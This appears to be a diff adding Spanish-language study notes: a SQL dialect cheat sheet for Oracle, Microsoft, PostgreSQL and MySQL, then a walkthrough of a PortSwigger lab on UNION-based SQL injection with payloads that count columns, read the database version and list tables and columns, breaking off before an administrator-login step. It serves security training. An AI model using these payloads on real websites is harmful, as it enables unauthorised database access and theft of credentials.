@@ -1,0 +1,103 @@
+-----------------------------------------CONOCER LA BASE DE DATOS----------------------------------------
+
+TIPOS MAS COMUNES (Sistemas Gestores de bases de datos Relacionales (SQL)):
+Oracle
+Microsoft
+PostgreSQL
+MySQL
+
+-----------------------------------------String concatenation---------------------------------------------
+
+Oracle 	'foo'||'bar'
+Microsoft 	'foo'+'bar'
+PostgreSQL 	'foo'||'bar'
+MySQL 	'foo' 'bar' [Note the space between the two strings]
+CONCAT('foo','bar')
+
+-----------------------------------------Substring--------------------------------------------------------
+
+Oracle 	SUBSTR('foobar', 4, 2)
+Microsoft 	SUBSTRING('foobar', 4, 2)
+PostgreSQL 	SUBSTRING('foobar', 4, 2)
+MySQL 	SUBSTRING('foobar', 4, 2)
+
+-----------------------------------------Comments---------------------------------------------------------
+
+Oracle 	
+    --comment
+Microsoft 	
+    --comment
+    /*comment*/
+PostgreSQL 	
+    --comment
+    /*comment*/
+MySQL 	
+    #comment
+    -- comment [Note the space after the double dash]
+    /*comment*/
+
+-----------------------------------------Database version--------------------------------------------------
+
+Oracle 	
+    SELECT banner FROM v$version
+    SELECT version FROM v$instance
+Microsoft
+ 	SELECT @@version
+PostgreSQL
+ 	SELECT version()
+MySQL
+ 	SELECT @@version 
+
+-----------------------------------------Database contents-------------------------------------------------
+
+Oracle 	
+    SELECT * FROM all_tables
+    SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+Microsoft
+ 	SELECT * FROM information_schema.tables
+    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+PostgreSQL
+ 	SELECT * FROM information_schema.tables
+    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+MySQL
+ 	SELECT * FROM information_schema.tables
+    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+Vistas generales en DB no Oracle:
+    - information_schema.columns  => column_name 
+    - information_schema.tables   => table_name
+
+-----------------------------------------Obtener informacion de la base de datos-----------------------------------------
+URL del laboratorio: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
+
+category=Pets'
+SELECT category, ' ' FROM categories WHERE category = 'Pets' 
+
+1.- Encontrar numero de columnas y tipo 
+    'ORDER+BY+2--
+    Cuantas columnas regresa la consulta original? 2 UNION c1 , c2
+
+    '+UNION+SELECT+'Buuuu','El america'--
+   
+2.- Encontrar versión de la DB
+
+    '+UNION+SELECT+version(),NULL--  
+
+    
+4.- Enlistar tablas
+    table_name        ====> information_schema.tables
+    '+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
+    TABLAS DE INTERES ====>
+
+
+5.- Enlistar columnas
+    column_name         ====> information_schema.columns
+
+    '+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='nombre_tabla'--
+
+    COLUMNAS DE INTERES ====>
+
+
+
+6.- Acceder como administrador
+    
+
